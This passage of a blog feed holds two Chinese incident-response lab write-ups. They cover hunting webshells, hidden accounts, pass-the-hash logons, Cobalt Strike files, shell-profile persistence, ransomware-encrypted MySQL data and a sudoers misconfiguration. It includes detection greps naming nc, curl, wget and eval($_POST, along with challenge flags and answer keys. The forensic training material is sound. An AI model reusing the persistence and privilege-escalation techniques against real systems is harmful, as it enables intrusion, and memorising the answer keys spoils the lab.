src="https://oss.waynejoons.icu/picphoto/20250617170431824.png"></p><p>去根目录下找到对应的文件，查看进行确认</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250617170613231.png"></p><p>发现两个都是黑客上传的webshell文件，按照时间顺序，第一个webshell文件名是SystemConfig.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;SystemConfig.php&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>找到黑客第二个webshell文件名是,将第二个webshell文件名 作为FLAG 提交;</strong></p><p>同上，第二个webshell文件名是syscon.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;syscon.php&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>找到黑客第二个webshell的连接密码是,将第二个webshell的连接密码 作为FLAG 提交;</strong></p><p>步骤三那里可以得到第二个webshell的连接密码是pass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;pass&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤#6"></a>步骤#6</h3><p><strong>找到黑客新建的隐藏账户,将新建的隐藏账户名字 作为FLAG 提交;</strong></p><p>有很多方法可以实现，这里选择注册表查看</p><p>win+r然后输入<code>regedit</code>打开注册表编辑器，找到HKEY_LOCAL_MACHINE\SAM\SAM，但是这里不能直接查看，我们右键点击SAM，赋予完全控制权限</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617171727151.png"></p><p>然后重新打开注册表，进入HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names，找到当前计算机全部用户，发现隐藏用户为admin$</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617171859371.png"></p><p>有时候攻击者可能不会直接新增隐藏用户，而是通过修改Guest用户注册表对应的F值（权限分配）与本地管理Administrator的权限相同，相当于克隆了Administrator，这也需要我们额外注意</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617172829611.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250617172904484.png"></p><p>还有一个方法，就是直接在此电脑那里查看，更快速，但是平时的话还是建议用注册表来分析，更加精准</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250617172433866.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;admin$&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-7"><a href="#步骤-7" class="headerlink" title="步骤#7"></a>步骤#7</h3><p><strong>找到黑客隐藏账户创建时间是,将隐藏账户创建时间是 作为FLAG 提交（答案格式：2024&#x2F;12&#x2F;3 9:16:23）;</strong></p><p>直接cmd打开，输入<code>net user admin$</code>查看账户详细信息</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617173055149.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:45:34&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-8"><a href="#步骤-8" class="headerlink" title="步骤#8"></a>步骤#8</h3><p><strong>找到黑客添加隐藏账户进管理员组的时间,将添加隐藏账户进管理员组的时间 作为FLAG 提交（答案格式：2024&#x2F;12&#x2F;3 9:16:23）;</strong></p><p>这里要用到系统事件分析，按Win+R键输入<code>eventvwr.msc</code>打开事件查看器</p><p>常见事件ID类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">4624 登录成功</span><br><span class="line">4625 登录失败，如果有人尝试破解系统密码，可以看到大量连续登录失败信息</span><br><span class="line">4726 删除用户</span><br><span class="line">4722 账号启用</span><br><span class="line">4725 账号禁用</span><br><span class="line">4723 修改密码</span><br><span class="line">4724 重置密码</span><br><span class="line">4634 注销成功</span><br><span class="line">4647 用户启动的注销</span><br><span class="line">4672 管理员登录</span><br><span class="line">4720 创建用户，使用系统漏洞攻击成功后，往往会创建一个用户，方便远程登录</span><br><span class="line">4732 加入安全组，常见于将新用户加入管理员组</span><br><span class="line">4733 移除出安全组</span><br><span class="line">4684 通过登陆界面登陆的</span><br></pre></td></tr></table></figure><p>这里我们筛选4732，时间的话我们根据admin$的创建时间，选择2023&#x2F;11&#x2F;6 4:45:00开始，结束时间随便，可以选小点缩小范围</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617173856062.png"></p><p>一个个点进去查看，找到添加到管理员组的事件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617174152500.png"></p><p>注意时间格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:46:07&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-9"><a href="#步骤-9" class="headerlink" title="步骤#9"></a>步骤#9</h3><p><strong>找到黑客在什么时间从文件中读取保留的密钥,将读取保留的密钥的时间 作为FLAG 提交（答案格式：2024&#x2F;12&#x2F;3 9:16:23）;</strong></p><p>这里我们聚焦于两个事件ID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5051 将保留的密钥写入文件</span><br><span class="line">5058 从文件中读取保留的密钥</span><br></pre></td></tr></table></figure><p>也是通过事件查看器去找，时间我这里选择不变</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617174904016.png"></p><p>也是按时间顺序找就行</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250617175649943.png"></p><p>注意时间格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:46:58&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-10"><a href="#步骤-10" class="headerlink" title="步骤#10"></a>步骤#10</h3><p><strong>找到黑客通过隐藏账户通过(PTH)哈希传递攻击登录的时间是,将(PTH)哈希传递攻击登录的时间 作为FLAG 提交;</strong></p><p>哈希传递攻击指的是攻击者无需知道用户的明文密码，只需窃取密码的哈希值（Hash），就能冒充该用户登录到网络中的其他系统。</p><p>这里我们聚焦于NtLmSsp（NT LAN Manager Security Support Provider），它用于处理 NTLM 协议的身份验证，我们去筛选登录事件，找到登录进程为NtLmSsp的即可，对应的事件ID为4624</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250617180524068.png"></p><p>按照时间顺序一个个筛选</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617180621831.png"></p><p>注意时间格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/6 4:47:28&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-11"><a href="#步骤-11" class="headerlink" title="步骤#11"></a>步骤#11</h3><p><strong>找到黑客上传的两个CobaltStrike木马文件名,将上传的两个CobaltStrike木马文件名 作为FLAG 提交（答案格式：”A.exe,B.exe”）;</strong></p><p>这里用绿盟D-Eyes主机命令行应急工具，将工具上传到目标机器，cmd输入<code>D-Eyes fs</code>扫盘</p><p>如果是多盘路径可以用<code>D-Eyes fs -P C:\\,D:\\tmp,D:\\tools</code>，也可以用<code>D-Eyes.exe ps</code>进行进程扫描，排查异常进程信息</p><p>这里我们就使用<code>D-Eyes fs</code>扫盘</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617181952959.png"></p><p>这里只找到之前的webshell文件，并没有找到cs可疑文件，原因是部分文件被Windows Defender自动隔离了，需要从隔离区恢复</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617182323541.png"></p><p>这里有个问题，如果用的是玄机靶场的话，已隔离威胁那里是找不到这些被隔离的文件，估计是那边默认给删除了，然后没被工作人员发现</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617192539101.png"></p><p>所以我用的是下载来的靶场，还原文件之后再扫一遍，排查可疑文件，发现多了两个文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617190500523.png"></p><p>把SystemTemp.exe和SysnomT.exe放进安恒云沙箱检测（拉取文件到本地之后不要运行）</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617191412052.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250617190959334.png"></p><p>可以看到这两个文件都是cs控制程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;SystemTemp.exe,SysnomT.exe&#125;</span><br></pre></td></tr></table></figure><h2 id="靶机内部题目答案"><a href="#靶机内部题目答案" class="headerlink" title="靶机内部题目答案"></a>靶机内部题目答案</h2><p>这是靶机内部<strong>答题.exe</strong>的答案，不是玄机靶场的答案，玄机的答案在上面各小点里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">X123567X</span><br><span class="line">2023‎年‎11‎月‎6‎日，‏‎4:55:13</span><br><span class="line">SystemConfig.php</span><br><span class="line">syscon.php</span><br><span class="line">pass</span><br><span class="line">admin$</span><br><span class="line">2023/11/6 4:45:34</span><br><span class="line">2023/11/6 4:46:07</span><br><span class="line">2023/11/6 4:46:58</span><br><span class="line">2023/11/6 4:47:28</span><br><span class="line">SystemTemp.exe和SysnomT.exe</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250617194919927.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><strong>特别鸣谢</strong></p><p>划水但不摆烂：<a href="https://mp.weixin.qq.com/s/4UoIw-On-0taB8s0xtjkAw">https://mp.weixin.qq.com/s/4UoIw-On-0taB8s0xtjkAw</a></p><p>Peterpan.exe：<a href="https://blog.csdn.net/administratorlws/article/details/141672688">https://blog.csdn.net/administratorlws/article/details/141672688</a></p>]]></content>
    
    
    <summary type="html">玄机靶场刷题记录</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | blueteam的小心思</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Blue-Team-Forensics/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Blue-Team-Forensics/</id>
    <published>2025-01-25T15:13:42.000Z</published>
    <updated>2025-07-20T05:03:22.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>玄机靶场日常刷题记录，练练手</p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250621145537068.png"></p><h2 id="玄机题目"><a href="#玄机题目" class="headerlink" title="玄机题目"></a>玄机题目</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag{md5}。</strong></p><p>在根目录发现wireshark.pcap文件，可以用wireshark进行流量分析</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124213638285.png"></p><p>将文件通过SFTP传到本地，过滤出http流量</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124213730214.png"></p><p>一个一个分析，发现可疑流量，直接得到账号密码</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124213901864.png"></p><p>md5加密得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d63edb0e9df4cf411398e3658c0237e0&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串”upload.php”的小写md5值，格式flag{md5}。</strong></p><p>继续往下分析，发现可疑流量</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124214228529.png"></p><p>发现这里上传了一个zip压缩包，追踪TCP流</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124214325549.png"></p><p>发现一句话木马，确定攻击者是通过该页面上传木马文件，加密pluginmgr.php字符得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b05c0be368ffa72e6cb2df7e1e1b27be&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag{md5}。</strong></p><p>直接查找关键字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r --include=&quot;*.php&quot; &#x27;eval($_POST&#x27; /</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124214732775.png"></p><p>加密文件得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124214821373.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a097b773ced57bb7d51c6719fe8fe5f5&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag{md5}。</strong></p><p>继续分析流量，发现可疑流量</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124215115623.png"></p><p>发现这个木马文件在尝试下载一个文件，直接搜索这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;is.world&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124215213748.png"></p><p>这里有个坑，不能直接加密文件，要用引号括起来再加密，不然中间的空格会分隔指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5sum &quot;/var/www/html/plugins/.       /is.world&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124215419804.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ee279c39bf3dcb225093bdbafeb9a439&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag{md5}。</strong></p><p>查看用户列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124215605268.png"></p><p>发现有个用户的用户ID和组ID都为0，权限很高，一般情况下只有管理员的UID和GID为0，说明这个是后门用户，直接加密得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4cda3461543c9a770a3349760594facd&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤#6"></a>步骤#6</h3><p><strong>攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。</strong></p><p>一般这种情况是修改了shell配置文件，常见的配置文件包括</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">用户级别</span><br><span class="line">1、&quot;~/.bashrc&quot;用于配置非登录 Shell 的环境（例如桌面终端）, 每次启动新的非登录 Shell 时加载</span><br><span class="line">2、&quot;~/.bash_profile&quot;用于配置 登录 Shell 的环境, 每次登录（例如通过 SSH 或控制台登录系统）</span><br><span class="line">3、&quot;~/.profile&quot;用于配置 登录 Shell 环境变量, 在用户登录时执行</span><br><span class="line">4、&quot;~/.zshrc&quot;每次启动 Z Shell 的非登录会话时加载</span><br><span class="line">5、&quot;~/.bash_logout&quot;在用户退出登录 Shell 时执行</span><br><span class="line"></span><br><span class="line">系统级别</span><br><span class="line">1、&quot;/etc/profile&quot;用于设置所有用户的登录 Shell 环境变量, 所有用户登录时加载</span><br><span class="line">2、&quot;/etc/bash.bashrc&quot;提供全局的非登录 Shell 配置, 每次启动新的非登录 Shell 时加载</span><br><span class="line">3、&quot;/etc/profile.d/*.sh&quot;当 /etc/profile 加载时, 会依次加载 /etc/profile.d 中的所有脚本文件（通常是 .sh 文件）</span><br><span class="line">4、&quot;/etc/environment&quot;用于配置系统范围的环境变量, 在用户登录前加载，影响所有用户和守护进程</span><br></pre></td></tr></table></figure><p>一般情况执行顺序，可以用作参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.登录 Shell</span><br><span class="line">系统级配置文件：</span><br><span class="line">/etc/profile</span><br><span class="line">/etc/profile.d/*.sh</span><br><span class="line">用户级配置文件：</span><br><span class="line">~/.bash_profile（如果不存在，则加载 ~/.profile）</span><br><span class="line">2.非登录 Shell</span><br><span class="line">系统级配置文件：</span><br><span class="line">/etc/bash.bashrc（如果系统支持）</span><br><span class="line">用户级配置文件：</span><br><span class="line">~/.bashrc</span><br></pre></td></tr></table></figure><p>这里一个一个尝试即可，发现&#x2F;etc&#x2F;profile有问题</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124220804951.png"></p><p>直接md5sum加密得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5sum /etc/profile</span><br><span class="line">#flag&#123;65bf3e4a9ac90d75ec28be0317775618&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-7"><a href="#步骤-7" class="headerlink" title="步骤#7"></a>步骤#7</h3><p><strong>攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。</strong></p><p>搜索后门触发命令，这里搜索的是用户目录下的可疑配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r -E &#x27;(nc|curl|wget|bash|python|eval|base64)&#x27; ~/</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124221150962.png"></p><p>发现有个配置文件尝试外联恶意网址</p><p>直接加密得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124221303685.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4acc9c465eeeb139c194893ec0a8bcbc&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-8"><a href="#步骤-8" class="headerlink" title="步骤#8"></a>步骤#8</h3><p><strong>攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag{md5}。</strong></p><p>确定数据库类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-units --type=service | grep -E &#x27;(mysql|mariadb|postgresql|mongodb|redis)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124223959804.png"></p><p>查看数据库的登录信息，一般放在配置文件“config.inc.php”里面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name config.inc.php</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124221600336.png"></p><p>得到数据库账号密码，用 Premium连接，一个一个尝试，发现有个数据库无法查看，说明被加密了，这里用的大佬的图</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124221800705.png"></p><p>查找对应文件，可以得到文件所在路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name JPMorgan@0020Chase</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124222206501.png"></p><p>加密文件夹名得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0928a5424aa6126e5923980ca103560e&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-9"><a href="#步骤-9" class="headerlink" title="步骤#9"></a>步骤#9</h3><p><strong>解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag{md5}。</strong></p><p>查看mysql文件夹，发现有个可疑文件</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124222530815.png"></p><p>直接抓取内容看看，发现是个加密脚本</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124222620261.png"></p><p>这里要写一个逆推脚本，参考网上的文章</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$currentDate</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d&quot;</span>);  </span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;2023-11-18&#x27;</span>);  </span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="string">&quot;DeepMountainsGD&quot;</span>), <span class="number">0</span>, <span class="number">16</span>);  </span><br><span class="line"><span class="variable">$filePath</span> = <span class="string">&quot;/var/lib/mysql/JPMorgan@0020Chase&quot;</span>;  </span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$filePath</span>);  </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;  </span><br><span class="line">                    <span class="variable">$fullPath</span> = <span class="variable">$filePath</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file</span>;  </span><br><span class="line">                        <span class="variable">$encryptedContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fullPath</span>);  </span><br><span class="line">                        <span class="variable">$decryptedContent</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$encryptedContent</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>);  </span><br><span class="line">                            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$fullPath</span>, <span class="variable">$decryptedContent</span>);  </span><br><span class="line">                        &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的时间是JPMorgan@0020Chase的创建时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stat JPMorgan@0020Chase#查看详细信息</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124223341527.png"></p><p>把脚本写进&#x2F;var&#x2F;www&#x2F;mysql&#x2F;目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim 1.php</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124223537024.png"></p><p>先按<code>i</code>插入代码，然后按一下<code>Esc</code>，再按住<code>shift + :</code>，然后输入<code>wq</code>保存</p><p>运行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php 1.php</span><br></pre></td></tr></table></figure><p>重启数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart mysql</span><br></pre></td></tr></table></figure><p>这时再返回Premium，可以发现数据库解密了，Harper用户对应Areer为Chef，加密即可</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124224210369.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8fd82b8864d71ed7fa12b59e6e34cd1c&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-10"><a href="#步骤-10" class="headerlink" title="步骤#10"></a>步骤#10</h3><p><strong>因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag{md5}。</strong></p><p>这里攻击者用到提权，可以查找以 root 用户身份拥有并设置了 SUID（Set User ID）权限的文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 2&gt;/dev/null#4000 代表文件权限中的 SUID 位。</span><br></pre></td></tr></table></figure><p>当一个文件被设置了 SUID 位，并且用户执行该文件时，该程序会以文件拥有者（通常是 root）的权限运行，而不是以当前用户的权限运行</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124224704235.png"></p><p>发现&#x2F;usr&#x2F;bin&#x2F;sudo，sudo 被广泛用于权限提升，估计攻击者通过这个提权，&#x2F;etc&#x2F;sudoers 包含了系统上 sudo 的配置和权限设置，这里抓取内容看一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/sudoers</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124225016730.png"></p><p>www-data用户被赋予了root权限，而且不需要输入密码，到这里已经可以确认漏洞配置了，就是&#x2F;etc&#x2F;sudoers ，加密文件得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/image-20250124225250689.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6585817513b0ea96707ebb0d04d6aeff&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><strong>特别鸣谢</strong></p><p>Peterpan.exe：<a href="https://blog.csdn.net/administratorlws/article/details/140471298">https://blog.csdn.net/administratorlws/article/details/140471298</a></p>]]></content>
    
    
    <summary type="html">玄机靶场刷题记录</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
</feed>
